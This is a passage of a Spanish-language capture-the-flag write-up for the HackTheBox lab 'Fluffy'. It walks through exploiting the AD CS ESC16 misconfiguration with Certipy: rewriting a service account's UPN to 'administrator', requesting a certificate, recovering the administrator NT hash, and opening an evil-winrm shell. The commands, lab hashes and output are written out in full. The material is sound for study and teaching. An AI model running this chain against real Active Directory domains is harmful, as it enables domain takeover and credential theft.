[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```

El resultado es similar al que ejecuté anteriormente , pero esta vez indica ESC16. Es importante tener en cuenta que ESC16 se agregó certipyen esta confirmación , menos de dos semanas antes del lanzamiento de `Fluffy`, por lo que es importante asegurarse de certipyque esté actualizado (cuando lo ejecuté por primera vez, mi versión 4.8.2 no encontró nada; solo uv tool upgrade certipy lo encontró después).

Los miembros de `Cert Publishers` pueden inscribirse en cualquier certificado generado por la CA.

#  ESC16 🔍

## Fondo

La **wiki** de certipy incluye una sección interesante sobre `ESC16` , que se activa cuando la propia CA está configurada globalmente para deshabilitar la inclusión de la szOID_NTDS_CA_SECURITY_EXTextensión de seguridad en todos los certificados que emite. Esta extensión es responsable de la "asignación robusta de certificados" y, sin ella, puedo modificar un usuario para que pueda obtener un certificado como cualquier otro usuario.

Con GenericWritemás de una cuenta, cambiaré su nombre principal de usuario (UPN) por el nombre de usuario de la cuenta de destino (por ejemplo, administrador). Luego, solicitaré un certificado como usuario controlado y, al ver el UPN de la cuenta de destino, devolveré un certificado con ese nombre, lo que me permitirá autenticarme como ese usuario.

## Actualizar UPN

Tengo hashes para varios miembros del grupo de cuentas de servicio, y cada uno tiene valores GenericWritesobre los demás. La cuenta ca_svc, al estar en Cert Publishers, puede inscribirse en cualquier certificado. Trabajaré desde winrm_svc y modificaré `ca_svc` siguiendo los pasos descritos en la wiki. Para empezar, ca_svc tiene los siguientes atributos:


```nmap
jorge@hacky$ certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc read
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
    userPrincipalName                   : ca_svc@fluffy.htb
    userAccountControl                  : 66048
    whenCreated                         : 2025-04-17T16:07:50+00:00
    whenChanged                         : 2025-05-22T04:19:48+00:00
```

Específicamente, el UPN es `“ca_svc@fluffy.htb”`.

Lo actualizaré a `"administrador"`:

-

```nmap
jorge@hacky$ certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn administrator update
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
oxdf@hacky$ certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc read
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
    userPrincipalName                   : administrator
    userAccountControl                  : 66048
    whenCreated                         : 2025-04-17T16:07:50+00:00
    whenChanged                         : 2025-05-22T07:17:25+00:00
```

## Solicitar certificado

Ahora necesito solicitar un certificado como `ca_svc`:

```nmap
jorge@hacky$ certipy req -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -target dc01.fluffy.htb -ca fluffy-DC01-CA -template User
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 18
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

```
Si la extensión de seguridad hubiera estado activada, no confiaría en este UPN no coincidente. Sin embargo, sin ella, devolvería un certificado con un UPN de administrador.

Ahora puedo limpiar y restablecer el `UPN` a lo que era:


```nmap
oxdf@hacky$ certipy account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn ca_svc@fluffy.htb update
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```

## Solicitar autorización

Con el certificado lo usaré `certipy` auth para obtener un ticket y NTLM:

```nmap
jorge@hacky$ certipy auth -dc-ip 10.10.11.69 -pfx administrator.pfx -u administrator -domain fluffy.htb
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

## Caparazón

Usaré ese hash para obtener un shell `WinRM`:

```nmap
jorge@hacky$ evil-winrm-py -i dc01.fluffy.htb -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
        ▘▜      ▘             
    █▌▌▌▌▐ ▄▖▌▌▌▌▛▌▛▘▛▛▌▄▖▛▌▌▌
    ▙▖▚▘▌▐▖  ▚▚▘▌▌▌▌ ▌▌▌  ▙▌▙▌
                          ▌ ▄▌ v0.0.8
[*] Connecting to dc01.fluffy.htb:5985 as administrator
evil-winrm-py PS C:\Users\Administrator\Documents>
```
Y root.txt:

```nmap
evil-winrm-py PS C:\Users\Administrator\desktop> cat root.txt
c3a85f56************************
```